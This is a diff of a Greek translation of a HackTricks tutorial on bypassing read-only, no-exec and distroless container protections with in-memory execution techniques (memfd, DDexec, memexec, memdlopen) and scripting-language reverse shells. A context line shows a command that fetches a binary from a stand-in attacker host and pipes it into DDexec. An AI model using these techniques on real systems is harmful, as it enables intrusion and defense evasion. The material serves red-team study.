@@ -1,8 +1,8 @@
 # Bypass FS protections: read-only / no-exec / Distroless
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,9 +15,9 @@
 </details>
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Αν ενδιαφέρεστε για **καριέρα hacking** και να χακάρετε το μη χακαρισμένο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική πολωνική_).
+Αν σας ενδιαφέρει μια **καριέρα hacking** και να χακάρετε το μη χακαρισμένο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση πολωνικών γραπτά και προφορικά_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -45,17 +45,17 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Ωστόσο, ακόμα και αν το σύστημα αρχείων είναι τοποθετημένο ως ro, το **`/dev/shm`** θα είναι ακόμα εγγράψιμο, οπότε είναι ψευδές ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **τοποθετημένος με προστασία no-exec**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.
+Ωστόσο, ακόμα και αν το σύστημα αρχείων είναι τοποθετημένο ως ro, το **`/dev/shm`** θα είναι ακόμα εγ writable, οπότε είναι ψευδές ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **τοποθετημένος με προστασία no-exec**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.
 
 {% hint style="warning" %}
-Από την προοπτική μιας κόκκινης ομάδας, αυτό καθιστά **πολύπλοκο το να κατεβάσετε και να εκτελέσετε** δυαδικά αρχεία που δεν είναι ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).
+Από την προοπτική μιας κόκκινης ομάδας, αυτό καθιστά **περίπλοκο να κατεβάσετε και να εκτελέσετε** δυαδικά αρχεία που δεν είναι ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).
 {% endhint %}
 
 ## Ευκολότερη παράκαμψη: Σενάρια
 
-Σημειώστε ότι ανέφερα δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** εφόσον ο διερμηνέας είναι μέσα στη μηχανή, όπως ένα **shell script** αν το `sh` είναι παρόν ή ένα **python** **script** αν το `python` είναι εγκατεστημένο.
+Σημειώστε ότι ανέφερα δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** αρκεί ο διερμηνέας να είναι μέσα στη μηχανή, όπως ένα **shell script** αν το `sh` είναι παρόν ή ένα **python** **script** αν το `python` είναι εγκατεστημένο.
 
-Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε το δυαδικό backdoor σας ή άλλα δυαδικά εργαλεία που μπορεί να χρειαστεί να εκτελέσετε.
+Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε την πίσω πόρτα σας ή άλλα εργαλεία δυαδικών αρχείων που μπορεί να χρειαστεί να εκτελέσετε.
 
 ## Παράκαμψη μνήμης
 
@@ -63,24 +63,24 @@ securityContext:
 
 ### Παράκαμψη FD + exec syscall
 
-Αν έχετε μερικούς ισχυρούς κινητήρες σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl**, ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό αρχείο για να το εκτελέσετε από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες και στη συνέχεια να καλέσετε μια **`exec` syscall** υποδεικνύοντας τον **fd ως το αρχείο προς εκτέλεση**.
+Αν έχετε μερικούς ισχυρούς κινητήρες σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό αρχείο για να το εκτελέσετε από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες και στη συνέχεια να καλέσετε μια **`exec` syscall** υποδεικνύοντας τον **fd ως το αρχείο προς εκτέλεση**.
 
 Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το έργο [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του περάσετε ένα δυαδικό αρχείο και θα δημιουργήσει ένα σενάριο στη δηλωμένη γλώσσα με το **δυαδικό αρχείο συμπιεσμένο και b64 κωδικοποιημένο** με τις οδηγίες για **αποκωδικοποίηση και αποσυμπίεση** σε έναν **fd** που δημιουργείται καλώντας την `create_memfd` syscall και μια κλήση στην **exec** syscall για να το εκτελέσετε.
 
 {% hint style="warning" %}
-Αυτό δεν λειτουργεί σε άλλες γλώσσες σεναρίων όπως η PHP ή το Node γιατί δεν έχουν καμία **προεπιλεγμένη μέθοδο για να καλέσουν ωμές syscalls** από ένα σενάριο, οπότε δεν είναι δυνατό να καλέσετε την `create_memfd` για να δημιουργήσετε τον **περιγραφέα μνήμης** για να αποθηκεύσετε το δυαδικό αρχείο.
+Αυτό δεν λειτουργεί σε άλλες γλώσσες σεναρίων όπως το PHP ή το Node γιατί δεν έχουν καμία **προεπιλεγμένη μέθοδο για να καλέσουν ωμές syscalls** από ένα σενάριο, οπότε δεν είναι δυνατό να καλέσετε την `create_memfd` για να δημιουργήσετε τον **περιγραφέα μνήμης** για να αποθηκεύσετε το δυαδικό αρχείο.
 
-Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα επιτρέπεται να το εκτελέσετε λόγω της **προστασίας no-exec**.
+Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα επιτρέπεται να το εκτελέσετε επειδή η **προστασία no-exec** θα ισχύει.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας διαδικασίας** αντικαθιστώντας την **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας διαδικασίας** αντικαθιστώντας το **`/proc/self/mem`**.
 
 Επομένως, **ελέγχοντας τον κώδικα συναρμολόγησης** που εκτελείται από τη διαδικασία, μπορείτε να γράψετε ένα **shellcode** και να "μεταλλάξετε" τη διαδικασία για να **εκτελέσετε οποιονδήποτε αυθαίρετο κώδικα**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από **μνήμη**.
+**DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από τη **μνήμη**.
 {% endhint %}
 ```bash
 # Basic example
@@ -96,11 +96,11 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 [**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **τρέξετε ένα διαφορετικό δυαδικό αρχείο**, δεν χρειάζεται να επανεκκινήσετε το DDexec, μπορείτε απλά να τρέξετε το memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον δαίμονα για να περάσετε νέα δυαδικά αρχεία για φόρτωση και εκτέλεση**.
 
-Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε το **memexec για να εκτελέσετε δυαδικά αρχεία από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε **memexec για να εκτελέσετε δυαδικά αρχεία από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Θα μπορούσε ακόμη και να επιτρέπει τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.
+Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Θα μπορούσε να επιτρέψει ακόμη και τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.
 
 ## Distroless Bypass
 
@@ -121,26 +121,26 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Ωστόσο, αν το παραβιασμένο container τρέχει για παράδειγμα μια εφαρμογή flask, τότε το python είναι εγκατεστημένο, και επομένως μπορείτε να αποκτήσετε μια **Python reverse shell**. Αν τρέχει node, μπορείτε να αποκτήσετε μια Node rev shell, και το ίδιο με σχεδόν οποιαδήποτε **γλώσσα scripting**.
 
 {% hint style="success" %}
-Χρησιμοποιώντας τη γλώσσα scripting, μπορείτε να **καταγράψετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
+Χρησιμοποιώντας τη γλώσσα scripting μπορείτε να **καταγράψετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
 {% endhint %}
 
 Αν δεν υπάρχουν **προστασίες `read-only/no-exec`**, μπορείτε να εκμεταλλευτείτε τη reverse shell σας για να **γράψετε στο σύστημα αρχείων τα δυαδικά σας αρχεία** και να τα **εκτελέσετε**.
 
 {% hint style="success" %}
-Ωστόσο, σε αυτού του είδους τα containers, αυτές οι προστασίες θα υπάρχουν συνήθως, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης μνήμης για να τις παρακάμψετε**.
+Ωστόσο, σε αυτού του είδους τα containers, αυτές οι προστασίες συνήθως θα υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης μνήμης για να τις παρακάμψετε**.
 {% endhint %}
 
 Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε κάποιες ευπάθειες RCE** για να αποκτήσετε reverse shells γλωσσών scripting και να εκτελέσετε δυαδικά αρχεία από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Αν ενδιαφέρεστε για μια **καριέρα hacking** και να χακάρετε το αχάκωτο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση πολωνικών_).
+Αν ενδιαφέρεστε για μια **καριέρα hacking** και να χακάρετε το αχάκτο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση πολωνικών γραπτά και προφορικά_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
